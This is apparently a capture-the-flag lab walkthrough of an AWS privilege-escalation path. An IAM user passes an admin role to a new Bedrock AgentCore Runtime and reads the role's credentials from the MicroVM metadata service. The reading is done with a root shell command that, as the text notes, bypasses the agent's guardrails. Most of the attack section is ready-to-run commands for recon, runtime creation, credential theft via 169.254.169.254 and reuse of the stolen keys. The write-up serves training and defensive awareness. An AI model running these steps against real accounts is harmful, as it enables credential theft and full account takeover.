# Solution: AgentCore Runtime Creation to Admin

The bedrock-003 scenario exploits a privilege escalation path that exists whenever an IAM principal holds `iam:PassRole` on a privileged role and the full set of permissions needed to create and command a Bedrock AgentCore Runtime. AgentCore Runtimes run inside Firecracker MicroVMs managed by AWS. Like EC2 instances, these MicroVMs expose a metadata service at 169.254.169.254 -- AgentCore's equivalent of the EC2 Instance Metadata Service (IMDS), called the MicroVM Metadata Service (MMDS). AWS assumes the Runtime's execution role on its behalf and vends the resulting temporary credentials to any process running inside the MicroVM via MMDS.

The critical capability here -- unique to the Runtime creation variant compared to bedrock-004's existing-runtime attack -- is that the attacker gets to choose which role the Runtime uses. By creating a brand-new Runtime and passing their chosen privileged execution role to it, the attacker controls which credentials appear at the MMDS endpoint. `InvokeAgentRuntimeCommand` then provides a direct path into the MicroVM, executing shell commands as root and bypassing the agent process, any loaded model, and all guardrails.

This is a PassRole attack surface that has expanded deep into AWS's AI/ML service ecosystem. The pattern is the same as passing a role to EC2 or Lambda -- the attacker never directly assumes the target role; they instead provision a service that AWS assumes it for, then reach into that service's compute environment to steal the resulting credentials. The difference is that AI services like AgentCore are newer, less scrutinized in security reviews, and often granted broad permissions to support complex agentic workflows.

## The Challenge

You start as `pl-prod-bedrock-003-to-admin-starting-user`, an IAM user with a narrow set of permissions. You have `iam:PassRole` on the target admin role and the bedrock-agentcore permissions needed to create a Runtime and invoke commands inside it. You cannot list IAM users, assume roles directly, or take any other privileged action in the account.

Your goal is to obtain credentials for `pl-prod-bedrock-003-to-admin-target-role`, an IAM role with `AdministratorAccess`. That role trusts `bedrock-agentcore.amazonaws.com` as a service principal, which means it can legally be passed to an AgentCore Runtime as its execution role. Getting there requires creating a Runtime with attacker-controlled infrastructure and reaching into its MicroVM.

Set up your starting credentials:

```bash
export AWS_ACCESS_KEY_ID=<starting_user_access_key_id>
export AWS_SECRET_ACCESS_KEY=<starting_user_secret_access_key>
unset AWS_SESSION_TOKEN

aws sts get-caller-identity
# arn:aws:iam::{account_id}:user/pl-prod-bedrock-003-to-admin-starting-user
```

Confirm you don't have admin access yet:

```bash
aws iam list-users --max-items 1
# AccessDenied
```

Good. No admin access yet.

## Reconnaissance

Use the helpful `iam:ListRoles` permission to discover the target role:

```bash
aws iam list-roles \
  --query 'Roles[?contains(RoleName, `bedrock-003`)].{Name:RoleName,Arn:Arn}' \
  --output table
```

You'll find `pl-prod-bedrock-003-to-admin-target-role`. Use `iam:GetRole` to inspect its trust policy:

```bash
aws iam get-role \
  --role-name pl-prod-bedrock-003-to-admin-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy shows `bedrock-agentcore.amazonaws.com` as a trusted service principal. This is the key signal: the role can be passed to an AgentCore Runtime as its execution role, and AWS will assume it on the Runtime's behalf. Any principal holding PassRole on this role can now exploit that trust relationship.

Capture the account ID and build the target role ARN now -- you'll use both repeatedly:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-bedrock-003-to-admin-target-role"
```

## Exploitation

The attack has four steps: prepare a container image, create the Runtime with the privileged execution role, wait for it to reach READY state, then invoke a shell command to extract MMDS credentials.

### Step 1: Prepare the Attacker Container Image

AgentCore Runtimes require a container image that the service pulls and runs inside the MicroVM. The image does not need to implement a real AI agent -- `InvokeAgentRuntimeCommand` executes commands as root in the MicroVM regardless of what the container process is doing. A minimal Alpine or Ubuntu base image with curl is sufficient.

Build and push the image to your own ECR repository (or any registry AgentCore can pull from):

```bash
# Authenticate to your ECR
aws ecr get-login-password --region us-east-1 | \
  docker login --username AWS --password-stdin \
  {your_account_id}.dkr.ecr.us-east-1.amazonaws.com

# Build and push
docker build -t bedrock-003-runtime-image .
docker tag bedrock-003-runtime-image:latest \
  {your_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest
docker push \
  {your_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest

IMAGE_URI="{your_account_id}.dkr.ecr.us-east-1.amazonaws.com/bedrock-003-runtime-image:latest"
```

### Step 2: Create the AgentCore Runtime with the Privileged Role

With the image ready, create the Runtime using your starting user credentials. The `executionRoleArn` is what makes this attack work -- you are passing the target admin role to the Runtime, and `iam:PassRole` is what authorizes this:

```bash
RUNTIME_ID=$(aws bedrock-agentcore-control create-agent-runtime \
  --region us-east-1 \
  --name bedrock-003-privesc-runtime \
  --runtime-artifact "{
    \"containerConfiguration\": {
      \"containerUri\": \"${IMAGE_URI}\"
    }
  }" \
  --role-arn "$TARGET_ROLE_ARN" \
  --network-configuration '{"networkMode":"PUBLIC"}' \
  --query 'agentRuntimeId' \
  --output text)

echo "Runtime ID: $RUNTIME_ID"
```

Next, create the Runtime endpoint (required for the Runtime to be fully operational):

```bash
aws bedrock-agentcore-control create-agent-runtime-endpoint \
  --region us-east-1 \
  --agent-runtime-id "$RUNTIME_ID" \
  --name default
```

### Step 3: Wait for READY State

The Runtime needs a minute or two to initialize. Use the helpful `bedrock-agentcore:GetAgentRuntime` permission to poll until it is ready:

```bash
while true; do
  STATUS=$(aws bedrock-agentcore-control get-agent-runtime \
    --region us-east-1 \
    --agent-runtime-id "$RUNTIME_ID" \
    --query 'status' --output text)
  echo "Status: $STATUS"
  [ "$STATUS" = "READY" ] && break
  sleep 15
done
```

Once you see `READY`, the MicroVM is running and MMDS is serving credentials for the target role.

### Step 4: Invoke a Shell Command to Steal MMDS Credentials

Now call `InvokeAgentRuntimeCommand` with a bash one-liner that reads temporary credentials from the MMDS. The flow mirrors EC2 IMDSv2: first request a session token, then use it to fetch the role name from the security-credentials path, then fetch the credential JSON for that role:

```bash
CREDS=$(aws bedrock-agentcore invoke-agent-runtime-command \
  --region us-east-1 \
  --agent-runtime-id "$RUNTIME_ID" \
  --command 'TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE' \
  --query 'output' \
  --output text)

echo "$CREDS"
```

The response is a JSON object like:

```json
{
  "Code": "Success",
  "LastUpdated": "...",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

Extract and export the credentials:

```bash
export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Token')
```

## Verification

Confirm you are now operating as the admin role:

```bash
aws sts get-caller-identity --query 'Arn' --output text
# arn:aws:sts::{account_id}:assumed-role/pl-prod-bedrock-003-to-admin-target-role/...
```

Verify administrator access by performing an action your original user could not:

```bash
aws iam list-users --max-items 3 --output table
# Returns a table of IAM users -- you now have full admin access
```

## Capture the Flag

With admin credentials active, read the CTF flag from SSM Parameter Store. `AdministratorAccess` grants `ssm:GetParameter` on all parameters in the account, including the flag parameter at `/pathfinding-labs/flags/bedrock-003-to-admin`. These are the same credentials you extracted from the MMDS in the previous step -- you are operating as the admin role, not reverting to your original user:

```bash
aws ssm get-parameter \
  --name /pathfinding-labs/flags/bedrock-003-to-admin \
  --query 'Parameter.Value' \
  --output text
```

The value printed is your scenario-specific flag. Its exact contents are deployment-specific -- the default ships in `flags.default.yaml` in the repo root. The retrieval path is consistent across all `to-admin` scenarios; only the scenario ID in the parameter name changes.

## What Happened

You started with a low-privilege IAM user and a set of permissions that looked like AI service tooling. By creating a brand-new AgentCore Runtime and passing your chosen privileged role to it -- something `iam:PassRole` explicitly authorizes -- you caused AWS to assume the admin role on behalf of your Runtime. The Firecracker MicroVM that AWS provisioned then vended those credentials through MMDS, and `InvokeAgentRuntimeCommand` gave you a direct shell channel into that MicroVM to retrieve them.

The critical distinction from the bedrock-004 variant (attacking an existing Runtime) is that here you control which role ends up in the MicroVM. You are not dependent on finding an existing Runtime with a useful execution role; you provision the target yourself. This requires more permissions -- you need Create in addition to Invoke -- but it gives you full control over the escalation target.

In real environments this pattern appears wherever teams have granted `iam:PassRole` broadly to support agentic AI workflows. The mental model "PassRole is fine as long as I don't give them sts:AssumeRole" breaks down as soon as there is a service that accepts an execution role, provisions compute, and makes credentials available from inside that compute. Bedrock AgentCore joins EC2, Lambda, ECS, Glue, and SageMaker as services where PassRole on a privileged role is equivalent to that role being compromised.
